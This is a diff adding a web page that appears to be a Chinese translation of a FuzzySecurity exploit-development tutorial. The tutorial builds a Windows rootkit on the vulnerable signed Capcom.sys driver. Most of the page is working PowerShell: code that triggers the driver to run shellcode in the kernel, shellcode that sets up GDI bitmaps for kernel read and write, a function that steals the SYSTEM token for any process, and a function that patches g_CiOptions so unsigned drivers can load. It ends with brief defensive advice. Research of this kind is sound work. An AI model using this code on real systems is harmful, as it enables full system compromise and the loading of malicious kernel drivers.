@@ -1,0 +1,423 @@
+<div class="detail_content markdown-body editormd-preview-container" id="markdown-body">
+<div id="app">
+<p>最近看了一篇关于恶意软件Derusbi分析的<a href="http://www.sekoia.fr/blog/windows-driver-signing-bypass-by-derusbi/" target="_blank">文章</a>，该文章的技术亮点就是利用已签名驱动的漏洞来加载未签名驱动。文中利用<a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2013-3956" target="_blank">CVE-2013-3956</a>漏洞来翻转驱动签名的效验位，这样恶意软件就可以随意加载其他驱动，然后Derusbi加载了NDIS驱动程序，这样就可以进行流量嗅探（我没有研究具体细节）。</p>
+<p>然而出于好奇，我觉得实现相同功能的POC将会非常困难（事实证明并非如此）。为了完全实现上述漏洞利用技术，我决定利用<a href="https://twitter.com/TheWack0lian/status/779397840762245124" target="_blank">@TheWack0lian</a>于2016年<a href="https://twitter.com/TheWack0lian/status/779397840762245124" target="_blank">9</a>月23日公布的签名驱动程序Capcom.sys中的漏洞来实现这一技术。好了，不再罗嗦了，直接操刀实战。</p>
+<h3 data-content="1" id="c54af6455c8694a043f1d1e536290efb">驱动漏洞</h3>
+<p>本文目的并非进行驱动漏洞分析，强烈建议先去看看如下<a href="https://twitter.com/TheColonial" target="_blank">@TheColonial</a> 针对Capcom.sys驱动的攻击分析视频，这样会对该驱动的漏洞机理有一个清晰的认识，能在大脑里形成一个漏洞攻击利用过程的画面，将有助于对本文的理解。</p>
+<p><img src="http://upload-images.jianshu.io/upload_images/3844411-93d73c2b2ef51d66.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"/><br/>
+<a href="https://youtu.be/pJZjWXxUEl4" target="_blank">https://youtu.be/pJZjWXxUEl4</a></p>
+<p><img src="http://upload-images.jianshu.io/upload_images/3844411-95a8a126a1c6906d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"/><a href="https://youtu.be/UGWqq5kTiso" target="_blank">https://youtu.be/UGWqq5kTiso</a></p>
+<p>基本上，就是把执行ring0 代码作为一个服务！它唯一的功能就是获取用户地址指针，然后禁用<a href="http://j00ru.vexillium.org/?p=783" target="_blank">SMEP</a>，然后在用户指针地址处执行代码，然后再恢复SMEP。该驱动漏洞利用过程的反汇编代码如下：</p>
+<p><img src="http://upload-images.jianshu.io/upload_images/3844411-9a8ad0e55cb74d19.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"/><br/>
+如下Power Shell POC实现了这个驱动漏洞的利用过程：</p>
+<pre><code>\# =&gt; cmp [rax-8], rcx
+
+echo "`n[&gt;] Allocating Capcom payload.."
+
+[IntPtr]$Pointer = [CapCom]::VirtualAlloc([System.IntPtr]::Zero, (8 + $Shellcode.Length), 0x3000, 0x40)
+
+$ExploitBuffer = [System.BitConverter]::GetBytes($Pointer.ToInt64()+8) + $Shellcode
+
+[System.Runtime.InteropServices.Marshal]::Copy($ExploitBuffer, 0, $Pointer, (8 + $Shellcode.Length))
+
+echo "[+] Payload size: $(8 + $Shellcode.Length)"
+
+echo "[+] Payload address: $("{0:X}" -f $Pointer.ToInt64())"
+
+
+
+$hDevice = [CapCom]::CreateFile("\\.\Htsysm72FB", [System.IO.FileAccess]::ReadWrite, [System.IO.FileShare]::ReadWrite, [System.IntPtr]::Zero, 0x3, 0x40000080, [System.IntPtr]::Zero)
+
+
+
+if ($hDevice -eq -1) {
+
+    echo "`n[!] Unable to get driver handle..`n"
+
+    Return
+
+} else {
+
+    echo "`n[&gt;] Driver information.."
+
+    echo "[+] lpFileName: \\.\Htsysm72FB"
+
+    echo "[+] Handle: $hDevice"
+
+}
+
+
+
+\# IOCTL = 0xAA013044
+
+\#---
+
+$InBuff = [System.BitConverter]::GetBytes($Pointer.ToInt64()+8)
+
+$OutBuff = 0x1234
+
+echo "`n[&gt;] Sending buffer.."
+
+echo "[+] Buffer length: $($InBuff.Length)"
+
+echo "[+] IOCTL: 0xAA013044"
+
+[CapCom]::DeviceIoControl($hDevice, 0xAA013044, $InBuff, $InBuff.Length, [ref]$OutBuff, 4, [ref]0, [System.IntPtr]::Zero) |Out-null</code></pre>
+<p>有了执行Shellcode的能力后，我选择构造一个原始GDI位图结构，它可以使我能够持续地读写内核，而不用重复地加载驱动。我通过 <a href="https://github.com/FuzzySecurity/PSKernel-Primitives/blob/master/Stage-gSharedInfoBitmap.ps1" target="_blank">Stage-gSharedInfoBitmap</a> 来创建位图，并以下列方式设置Shellcode：</p>
+<pre><code>\# Leak BitMap pointers
+
+echo "`n[&gt;] gSharedInfo bitmap leak.."
+
+$Manager = Stage-gSharedInfoBitmap
+
+$Worker = Stage-gSharedInfoBitmap
+
+echo "[+] Manager bitmap Kernel address: 0x$("{0:X16}" -f $($Manager.BitmapKernelObj))"
+
+echo "[+] Worker bitmap Kernel address: 0x$("{0:X16}" -f $($Worker.BitmapKernelObj))"
+
+
+
+\# Shellcode buffer
+
+[Byte[]] $Shellcode = @(
+
+    0x48, 0xB8) + [System.BitConverter]::GetBytes($Manager.BitmappvScan0) + @( # mov rax,$Manager.BitmappvScan0
+
+    0x48, 0xB9) + [System.BitConverter]::GetBytes($Worker.BitmappvScan0)  + @( # mov rcx,$Manager.BitmappvScan0
+
+    0x48,0x89,0x08,                                                   # mov qword ptr [rax],rcx
+
+    0xC3                 # ret
+
+)</code></pre>
+<p>想进一步了解该技术的实现细节，可以参考我之前以ID<a href="https://twitter.com/mwrlabs" target="_blank">@mwrlabs</a>发表的文章 <a href="https://labs.mwrinfosecurity.com/blog/a-tale-of-bitmaps/" target="_blank">A Tale Of Bitmaps: Leaking GDI Objects Post Windows 10 Anniversary Edition</a>以及《我的WINDOWS 攻击之旅》系列的<a href="http://www.fuzzysecurity.com/tutorials/expDev/21.html" target="_blank">第17篇</a>。</p>
+<h3 data-content="1" id="3211baaf8bbe4a0bd48df7cc0f7be2ed">Rootkit 功能</h3>
+<p>有了对内核的读写能力之后，我们就可以开始实现我们的Rootkit的功能了。对此，我决定专注于实现以下两个不同功能：</p>
+<p>（1）将任意PID提升为SYSTEM;</p>
+<p>（2）在运行时禁用驱动程序签名保护，将非签名代码加载到内核中。</p>
+<h3 data-content="1" id="9d083dea3dd5d84abba9571d4de825ed">任意进程权限提升</h3>
+<p>一般来说，我们需要遍历EPROCESS结构的链表，然后复制SYSTEM EPROCESS令牌字段，并使用此值覆盖掉目标EPROCESS结构的令牌字段。在没有其他更好的漏洞利用的情况下，我们只有通过用户空间来泄露 System (PID 4) EPROCESS 结构的指针：</p>
+<p><img src="http://upload-images.jianshu.io/upload_images/3844411-5e097cbf8dd8b479.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"/><br/>
+需要注意的是，从WIN8.1之后需要具有普通权限，才可以通过“SystemModuleInformation”来泄漏当前加载的NT内核的基址。我们可以在PowerShell中使用<a href="https://github.com/FuzzySecurity/PSKernel-Primitives/blob/master/Get-LoadedModules.ps1" target="_blank">Get-LoadedModules</a>轻松实现此过程，并在KD中验证我们的结果。</p>
+<p><img src="http://upload-images.jianshu.io/upload_images/3844411-db63fa823b90a144.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"/><br/>
+非常棒，现在我们找到了一个方法来获得System EPROCESS 结构指针，同时我们可以通过构造的位图结构来读取SYSTEM token 。最后需要做的就是根据 "ActiveProcessLinks" 链来找到我们需要提升权限的进程的 EPROCESS结构。在x64 Win10平台，此链表结构如下：</p>
+<p><img src="http://upload-images.jianshu.io/upload_images/3844411-545c5fd97f009336.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"/><br/>
+该链表是一个双向循环链表，那么我们可以通过读取EPROCESS 结构，然后判断PID是否为目标进程，如果是则覆盖该进程Token，否则继续遍历直到获得目标进程的EPROCESS 结构。</p>
+<p>EPROCESS 结构是非公开的，并且在不同的WIN操作系统上也不相同，但是我们可以通过维护一个静态的偏移列表来解决这个问题。在此强烈建议看一下由<a href="https://twitter.com/rwfpl" target="_blank">@rwfpl</a>维护的一个工程 <a href="http://terminus.rewolf.pl/terminus/" target="_blank">Terminus Project</a>。下面的powershell函数实现了这个令牌窃取逻辑。</p>
+<pre><code>function Capcom-ElevatePID {
+
+    param ([Int]$ProcPID)
+
+
+
+    # Check our bitmaps have been staged into memory
+
+    if (!$ManagerBitmap -Or !$WorkerBitmap) {
+
+        Capcom-StageGDI
+
+        if ($DriverNotLoaded -eq $true) {
+
+            Return
+
+        }
+
+    }
+
+
+
+    # Defaults to elevating Powershell
+
+    if (!$ProcPID) {
+
+        $ProcPID = $PID
+
+    }
+
+
+
+    # Make sure the pid exists!
+
+    # 0 is also invalid but will default to $PID
+
+    $IsValidProc = ((Get-Process).Id).Contains($ProcPID)
+
+    if (!$IsValidProc) {
+
+        Write-Output "`n[!] Invalid process specified!`n"
+
+        Return
+
+    }
+
+
+
+    # _EPROCESS UniqueProcessId/Token/ActiveProcessLinks offsets based on OS
+
+    # WARNING offsets are invalid for Pre-RTM images!
+
+    $OSVersion = [Version](Get-WmiObject Win32_OperatingSystem).Version
+
+    $OSMajorMinor = "$($OSVersion.Major).$($OSVersion.Minor)"
+
+    switch ($OSMajorMinor)
+
+    {
+
+        '10.0' # Win10 / 2k16
+
+        {
+
+            $UniqueProcessIdOffset = 0x2e8
+
+            $TokenOffset = 0x358          
+
+            $ActiveProcessLinks = 0x2f0
+
+        }
+
+
+
+        '6.3' # Win8.1 / 2k12R2
+
+        {
+
+            $UniqueProcessIdOffset = 0x2e0
+
+            $TokenOffset = 0x348          
+
+            $ActiveProcessLinks = 0x2e8
+
+        }
+
+
+
+        '6.2' # Win8 / 2k12
+
+        {
+
+            $UniqueProcessIdOffset = 0x2e0
+
+            $TokenOffset = 0x348          
+
+            $ActiveProcessLinks = 0x2e8
+
+        }
+
+
+
+        '6.1' # Win7 / 2k8R2
+
+        {
+
+            $UniqueProcessIdOffset = 0x180
+
+            $TokenOffset = 0x208          
+
+            $ActiveProcessLinks = 0x188
+
+        }
+
+    }
+
+
+
+    # Get EPROCESS entry for System process
+
+    $SystemModuleArray = Get-LoadedModules
+
+    $KernelBase = $SystemModuleArray[0].ImageBase
+
+    $KernelType = ($SystemModuleArray[0].ImageName -split "\\")[-1]
+
+    $KernelHanle = [Capcom]::LoadLibrary("$KernelType")
+
+    $PsInitialSystemProcess = [Capcom]::GetProcAddress($KernelHanle, "PsInitialSystemProcess")
+
+    $SysEprocessPtr = $PsInitialSystemProcess.ToInt64() - $KernelHanle + $KernelBase
+
+    $CallResult = [Capcom]::FreeLibrary($KernelHanle)
+
+    $SysEPROCESS = Bitmap-Read -Address $SysEprocessPtr
+
+    $SysToken = Bitmap-Read -Address $($SysEPROCESS+$TokenOffset)
+
+    Write-Output "`n[+] SYSTEM Token: 0x$("{0:X}" -f $SysToken)"
+
+
+
+    # Get EPROCESS entry for PID
+
+    $NextProcess = $(Bitmap-Read -Address $($SysEPROCESS+$ActiveProcessLinks)) - $UniqueProcessIdOffset - [System.IntPtr]::Size
+
+    while($true) {
+
+        $NextPID = Bitmap-Read -Address $($NextProcess+$UniqueProcessIdOffset)
+
+        if ($NextPID -eq $ProcPID) {
+
+            $TargetTokenAddr = $NextProcess+$TokenOffset
+
+            Write-Output "[+] Found PID: $NextPID"
+
+            Write-Output "[+] PID token: 0x$("{0:X}" -f $(Bitmap-Read -Address $($NextProcess+$TokenOffset)))"
+
+            break
+
+        }
+
+        $NextProcess = $(Bitmap-Read -Address $($NextProcess+$ActiveProcessLinks)) - $UniqueProcessIdOffset - [System.IntPtr]::Size
+
+    }
+
+
+
+    # Duplicate token!
+
+    Write-Output "[!] Duplicating SYSTEM token!`n"
+
+    Bitmap-Write -Address $TargetTokenAddr -Value $SysToken
+
+}</code></pre>
+<p><img src="http://upload-images.jianshu.io/upload_images/3844411-4bc37195a06ffbae.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"/></p>
+<h3 data-content="1" id="aa37e11017c8fab626cb5f122216f194">驱动签名绕过</h3>
+<p>作为本文的参考文章，建议去读一下由 <a href="https://twitter.com/j00ru" target="_blank">@j00ru</a>写的关于驱动强制签名的<a href="http://j00ru.vexillium.org/?p=377" target="_blank">文章</a>。文章指出WINDOWS平台下的代码效验，是通过一个二进制文件ci.dll (=&gt; %WINDIR%\System32)来管理的。在Windows 8之前，CI导出一个全局布尔变量g_CiEnabled，它很明显的指明签名是启用还是禁用。在Windows 8+中，g_CiEnabled被另一个全局变量g_CiOptions替换，g_CiOptions是标志的组合（ 0x0=disabled, 0x6=enabled, 0x8=Test Mode）。</p>
+<p>时间原因，该模块仅通过g_CiOptions来修改代码效验标志，因此只适用Windows 8+。不过类似的方法也适用g_CiEnabled（可以在gihub自行搜索）。基本上，我们将使用和恶意软件Derusbi 一样的技术来绕过签名保护。因为g_CiOptions这个变量并没有被导出，因此我们在pach的时候需要进行一些动态计算。通过反编译 CI!CiInitialize，我们发现它泄露了，一个指向g_CiOptions的指针。</p>
+<p><img src="http://upload-images.jianshu.io/upload_images/3844411-6e9934e947761aa4.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"/><br/>
+类似地，我们可以不借助任何漏洞，通过用户空间来泄露 CI!CiInitialize的地址。</p>
+<p><img src="http://upload-images.jianshu.io/upload_images/3844411-559cc020b41dbaf8.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"/><br/>
+至此，剩下的就是实现一些指令搜索逻辑，来读取g_CiOptions的值了。首先我们找到第一个jmp(0xe9)指令,然后再找到第一个"mov dword prt[xxxxx], ecx" (0x890D)指令，就可以得到g_CiOptions的地址。这样我们就可以把g_CiOptions的值改成任何我们想要的值了。实现这一搜索逻辑的powershell 函数如下：</p>
+<pre><code>function Capcom-DriverSigning {
+
+    param ([Int]$SetValue)
+
+
+
+    # Check our bitmaps have been staged into memory
+
+    if (!$ManagerBitmap -Or !$WorkerBitmap) {
+
+        Capcom-StageGDI
+
+        if ($DriverNotLoaded -eq $true) {
+
+            Return
+
+        }
+
+    }
+
+
+
+    # Leak CI base =&gt; $SystemModuleCI.ImageBase
+
+    $SystemModuleCI = Get-LoadedModules |Where-Object {$_.ImageName -Like "*CI.dll"}
+
+
+
+    # We need DONT_RESOLVE_DLL_REFERENCES for CI LoadLibraryEx
+
+    $CIHanle = [Capcom]::LoadLibraryEx("ci.dll", [IntPtr]::Zero, 0x1)
+
+    $CiInitialize = [Capcom]::GetProcAddress($CIHanle, "CiInitialize")
+
+
+
+    # Calculate =&gt; CI!CiInitialize
+
+    $CiInitializePtr = $CiInitialize.ToInt64() - $CIHanle + $SystemModuleCI.ImageBase
+
+    Write-Output "`n[+] CI!CiInitialize: $('{0:X}' -f $CiInitializePtr)"
+
+
+
+    # Free CI handle
+
+    $CallResult = [Capcom]::FreeLibrary($CIHanle)
+
+
+
+    # Calculate =&gt; CipInitialize
+
+    # jmp CI!CipInitialize
+
+    for ($i=0;$i -lt 500;$i++) {
+
+        $val = ("{0:X}" -f $(Bitmap-Read -Address $($CiInitializePtr + $i))) -split '(..)' | ? { $_ }
+
+        # Look for the first jmp instruction
+
+        if ($val[-1] -eq "E9") {
+
+            $Distance = [Int]"0x$(($val[-3,-2]) -join '')"
+
+            $CipInitialize = $Distance + 5 + $CiInitializePtr + $i
+
+            Write-Output "[+] CI!CipInitialize: $('{0:X}' -f $CipInitialize)"
+
+            break
+
+        }
+
+    }
+
+
+
+    # Calculate =&gt; g_CiOptions
+
+    # mov dword ptr [CI!g_CiOptions],ecx
+
+    for ($i=0;$i -lt 500;$i++) {
+
+        $val = ("{0:X}" -f $(Bitmap-Read -Address $($CipInitialize + $i))) -split '(..)' | ? { $_ }
+
+        # Look for the first jmp instruction
+
+        if ($val[-1] -eq "89" -And $val[-2] -eq "0D") {
+
+            $Distance = [Int]"0x$(($val[-6..-3]) -join '')"
+
+            $g_CiOptions = $Distance + 6 + $CipInitialize + $i
+
+            Write-Output "[+] CI!g_CiOptions: $('{0:X}' -f $g_CiOptions)"
+
+            break
+
+        }
+
+    }
+
+     # print g_CiOptions
+
+    Write-Output "[+] Current CiOptions Value: $('{0:X}' -f $(Bitmap-Read -Address $g_CiOptions))`n"
+
+
+
+    if ($SetValue) {
+
+        Bitmap-Write -Address $g_CiOptions -Value $SetValue
+
+        # print new g_CiOptions
+
+        Write-Output "[!] New CiOptions Value: $('{0:X}' -f $(Bitmap-Read -Address $g_CiOptions))`n"
+
+    }
+
+}</code></pre>
+<p>下面的屏幕截图显示当前g_CiOptions valus是0x6（启用），我们加载“evil.sys”时被阻止。</p>
+<p><img src="http://upload-images.jianshu.io/upload_images/3844411-7071413a0a32ce7f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"/><br/>
+覆盖该值后，未签名驱动被顺利加载：</p>
+<p><img src="http://upload-images.jianshu.io/upload_images/3844411-ecacd6d13590d69c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"/><br/>
+稍微有趣的是 g_CiOptions 受 PatchGuard保护，一旦它发现 g_CiOptions 被更改，就会蓝屏 (=&gt; CRITICAL_STRUCTURE_CORRUPTION) 。然而实际上并不会蓝屏，修改了 g_CiOptions 后PatchGuard并不会马上检测到，如果加载了未签名驱动后，再马上恢复 g_CiOptions， PatchGuard就无能为力了。我的深度防御建议是在加载驱动时触发PatchGuard 对CI的检查，不过这并不能完全阻止攻击者对加载非法驱动的探索，只是它会提高这一利用过程的难度等级。</p>
+<h3 data-content="1" id="853ede717eb7e4d2e6dda3f0422081dd">总结</h3>
+<p>我相信本文的案例足以证明第三方签名驱动会对WINDOWS 内核构成严重威胁。同时我发现，进行简单的内核破坏比预期更加容易，特别是与PatchGuard延时配合的时候。总之，我觉得最明智的做法是针对驱动白名单部署设备保护，从而从根本上消除这种类型的攻击。</p>
+<p>出于学习和测试的目的，我把 <a href="https://github.com/FuzzySecurity/Capcom-Rootkit" target="_blank">Capcom-Rootkit</a> 放到了github上，Don't be a jackass!</p>
+<p><strong>参考资料：</strong></p>
+<p>+ Capcom-Rootkit (<a href="https://twitter.com/fuzzysec" target="_blank">@FuzzySec</a>) - <a href="https://github.com/FuzzySecurity/Capcom-Rootkit" target="_blank">here</a><br/>
++ Windows driver signing bypass by Derusbi - <a href="http://www.sekoia.fr/blog/windows-driver-signing-bypass-by-derusbi/" target="_blank">here</a><br/>
++ A quick insight into the Driver Signature Enforcement (<a href="https://twitter.com/j00ru" target="_blank">@j00ru</a>) - <a href="http://j00ru.vexillium.org/?p=377" target="_blank">here</a><br/>
++ Defeating x64 Driver Signature Enforcement (<a href="https://twitter.com/hfiref0x" target="_blank">@hFireF0X</a>) - <a href="http://www.kernelmode.info/forum/viewtopic.php?f=11&amp;t=3322" target="_blank">here</a></p>
+<p>原文链接：<a href="http://www.fuzzysecurity.com/tutorials/28.html" target="_blank">http://www.fuzzysecurity.com/tutorials/28.html</a></p>
+</div>
+</div>
